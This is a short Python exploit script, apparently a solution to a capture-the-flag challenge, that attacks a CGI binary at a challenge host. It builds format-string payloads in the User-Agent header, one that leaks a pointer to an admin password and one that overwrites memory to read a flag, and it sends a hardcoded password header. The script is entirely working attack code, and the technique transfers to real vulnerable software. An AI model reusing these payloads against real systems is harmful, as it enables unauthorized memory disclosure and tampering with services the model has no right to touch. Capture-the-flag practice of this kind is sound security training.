#!/usr/bin/env python

import requests as req
from pwn import *

headers = {}
bin = ELF('sec.bak')
log.info(hex(bin.got['getenv']))

headers['X-DEBUG'] = '1'
#headers['User-Agent'] = 'A'*1008 + "%275$s" #%275%p gives the pointer to the AdminPass variable. s can then be used to derefrence and read the password!


#%27750 gives the proper padding to overwrite the br of brag with the fl of flag
headers['User-Agent'] = 'A'*1008 + "%27750x%267$hn.%267$s" 

headers['X-PASSWORD'] = 'xbYP3h7Ua94c'

url = 'https://nessus-braggart.chals.io/sec.cgi'

res = req.post(url, headers=headers)

log.info(res.text)
